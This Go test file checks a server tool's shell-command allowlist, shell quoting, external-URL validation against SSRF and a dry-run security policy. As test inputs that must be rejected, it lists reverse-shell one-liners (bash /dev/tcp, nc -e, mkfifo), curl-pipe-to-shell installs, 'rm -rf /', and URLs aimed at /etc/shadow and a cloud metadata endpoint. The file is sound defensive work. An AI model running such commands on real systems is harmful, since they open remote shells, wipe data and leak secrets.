package main

import (
	"strings"
	"testing"
)

func TestIsAllowedShellCommand(t *testing.T) {
	tests := []struct {
		in      string
		allowed bool
	}{
		{"systemctl restart xray", true},
		{"nginx -t", true},
		{"apt-get update", true},
		{"certbot renew --quiet", true},
		{"curl -fsSL https://example.com/install.sh | bash", false},
		{"curl evil.sh | sh", false},
		{"curl https://raw.githubusercontent.com/example.sh -o /tmp/x.sh", true},
		{"rm -rf /", false},
		{"rm -rf /*", false},
		{"rm -rf  /tmp", false},
		{"/bin/bash -i", false},
		{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", false},
		{"python3 -c 'import socket'", false},
		{"python -c print(1)", false},
		{"nc -e /bin/sh 10.0.0.1 9999", false},
		{"mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1", false},
		{"echo hello", true},
		{"xray api stats --server=127.0.0.1:10085", true},
	}
	for _, tt := range tests {
		if got := isAllowedShellCommand(tt.in); got != tt.allowed {
			t.Fatalf("isAllowedShellCommand(%q) = %v, want %v", tt.in, got, tt.allowed)
		}
	}
}

func TestShellQuoteEscapesSingleQuote(t *testing.T) {
	got := shellQuote("it's me")
	want := "'it'\"'\"'s me'"
	if got != want {
		t.Fatalf("shellQuote = %q, want %q", got, want)
	}
}

func TestValidateExternalURL(t *testing.T) {
	tests := []struct {
		in  string
		err bool
	}{
		{"https://sub.example.com/list.txt", false},
		{"http://example.org/subscription", false},
		{"https://a.b.c/x", false},
		{"https://sub.example.com:8080/x", false},
		{"file:///etc/shadow", true},
		{"ftp://example.com/x", true},
		{"http://127.0.0.1/x", true},
		{"http://10.0.0.1/x", true},
		{"http://192.168.1.1/x", true},
		{"http://169.254.169.254/latest/meta-data/", true},
		{"http://172.16.0.5/x", true},
		{"https://example.com@evil.com/x", true},
		{"http://example.com/../../etc/passwd", false}, // path traversal blocked by filesystem, not by us
		{"http://localhost/x", true},
		{"http://evil.com/x", false}, // SSRF only blocks private/metadata IPs, not arbitrary hostnames
		{"http://127.0.0.1.example.com/x", true},
	}
	for _, tt := range tests {
		err := validateExternalURL(tt.in)
		gotErr := err != nil
		if gotErr != tt.err {
			t.Fatalf("validateExternalURL(%q) err=%v (got: %v), want err=%v", tt.in, err, gotErr, tt.err)
		}
	}
}

func TestApplySecurityPolicyDryRunDoesNotValidateSSHD(t *testing.T) {
	payload := map[string]any{
		"disablePasswordSSH": true,
		"dryRun":             true,
	}
	out, err := applySecurityPolicy(payload)
	if err != nil {
		t.Fatalf("dry-run returned error: %v", err)
	}
	// Dry-run must short-circuit BEFORE sshd -t runs (which would write/validate the config).
	if strings.Contains(out, "validated") {
		t.Fatalf("dry-run output should not contain 'validated', got: %q", out)
	}
	if !strings.Contains(out, "skipped") {
		t.Fatalf("dry-run output should mention 'skipped', got: %q", out)
	}
	if !strings.Contains(out, "security policy evaluated") {
		t.Fatalf("dry-run output missing 'security policy evaluated', got: %q", out)
	}
}
